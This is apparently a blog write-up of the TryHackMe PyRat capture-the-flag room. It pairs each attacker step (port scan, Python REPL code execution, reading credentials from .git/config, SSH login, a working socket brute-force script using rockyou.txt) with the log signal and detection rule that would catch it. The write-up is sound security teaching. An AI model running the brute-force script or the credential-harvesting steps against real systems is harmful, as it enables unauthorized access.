---
title: "TryHackMe PyRat — What a Defender Would Have Caught"
description: "Walking the PyRat room and annotating each attacker step with the log signature, SIEM query, and Sigma rule that would have caught it."
date: 2026-03-18
platform: TryHackMe
difficulty: medium
tags: [ctf, tryhackme, python, rce, ssh, brute-force, blue-team]
---

[PyRat](https://tryhackme.com/room/pyrat) is a fun TryHackMe room: a Python REPL exposed over a raw TCP socket, leading to RCE, then post-exploitation through a leaky `.git` directory, then a credential brute-force against the same Python service.

I'll walk it as a player — but for every attacker move, I'll annotate **what the SOC would see** and **how I'd detect it**. That's where the actual learning lives once the flag is captured.

## Recon

```bash
nmap -sS -p- 10.10.x.x
```

Open ports: **22 (SSH)** and **8000 (custom HTTP-ish)**.

> **Defender:** A full TCP scan against a single host is itself an IoC. Suricata's `ET SCAN NMAP -sS` rule will fire. A SOC with NetFlow/Zeek would see a single source touching >1000 unique destination ports within seconds.

## Python REPL RCE

`nc 10.10.x.x 8000` lands in something that evaluates Python:

```python
print("hello")
# → hello
```

Already game over. We can enumerate the filesystem:

```python
import os
print([r for r, d, ds in os.walk('/') if ".git" in d])
```

> **Defender:** `os.walk('/')` from a service that should never need to is a screaming anomaly. A Falco rule on `unexpected file access by` the Python process owner would catch this. So would `auditd` rules on read of `/etc/`, `/root/`, or any `.git/config` outside expected paths.

## Credential leak via `.git/config`

The walk reveals `/opt/dev/.git/config`. Reading it:

```python
print(open("/opt/dev/.git/config").read())
```

…contains a username/password embedded in a remote URL. Classic `.git` exposure.

> **Defender:** This is one of those *"why does this even exist?"* misconfigurations a regular audit would catch. A weekly sweep with `find / -name .git -type d -not -path "/home/*"` and an alert on hits outside expected dev hosts is cheap insurance. Better still: hooks that block secrets from being committed in the first place (`pre-commit` + `gitleaks`).

## SSH with the leaked creds

```bash
ssh think@10.10.x.x
cat users.txt   # first flag
```

> **Defender:** SSH from an IP previously seen scanning the host on port 8000 is a *strong* correlation signal. A 10-line SPL query joining `sourcetype=suricata` and `auth.log Accepted password` by source IP within 1 hour would surface this in any real SOC.

## Brute-force against the same Python service

The room author hides an `admin` path that prompts for a password over the same TCP socket. A small Python script tries every entry in rockyou.txt:

```python
import socket

TARGET_IP = '10.10.x.x'
TARGET_PORT = 8000
WORDLIST = '/usr/share/wordlists/rockyou.txt'

with open(WORDLIST, 'r', encoding="latin-1") as f:
    for password in f:
        password = password.strip()
        try:
            s = socket.socket()
            s.settimeout(3)
            s.connect((TARGET_IP, TARGET_PORT))
            s.sendall(b"admin\n")
            data = s.recv(4096).decode()
            if "Password:" in data:
                s.sendall((password + "\n").encode())
                resp = s.recv(4096).decode()
                if "Password:" not in resp:
                    print(f"[SUCCESS] {password}")
                    break
            s.close()
        except Exception as e:
            print("err:", e)
```

> **Defender:** This is the easiest detection of the whole room. A single source IP opening thousands of short-lived TCP connections to a single port per minute is *textbook* brute-force. Zeek's `conn.log` aggregated by `id.orig_h` per minute, alert when the bucket exceeds N. Or a Sigma rule against `winlog` if it were a Windows service.

## Lessons for the blue side

| Step | Attacker move | Detection signal |
|---|---|---|
| 1 | Full port scan | Suricata/Snort scan rule, NetFlow burst |
| 2 | RCE via Python REPL | Process spawned by service binary doing unusual filesystem reads |
| 3 | `os.walk('/')` | Auditd / Falco file-access rule outside expected paths |
| 4 | Read `.git/config` | File-integrity monitoring on `.git` outside `/home` |
| 5 | SSH with leaked creds | Correlate scan IP → `Accepted password` for new account |
| 6 | Service brute-force | Per-source TCP-connection-rate threshold |

Most attacks are loud once you know where to look. CTFs are good practice for both sides of that sentence.

## What I want to try next

Reproduce this room in a personal lab with Suricata + Zeek + Wazuh shipping to ELK, and verify that each of the six detections above actually fires. If I write that up, it'll show up in the writeups list. See you then.
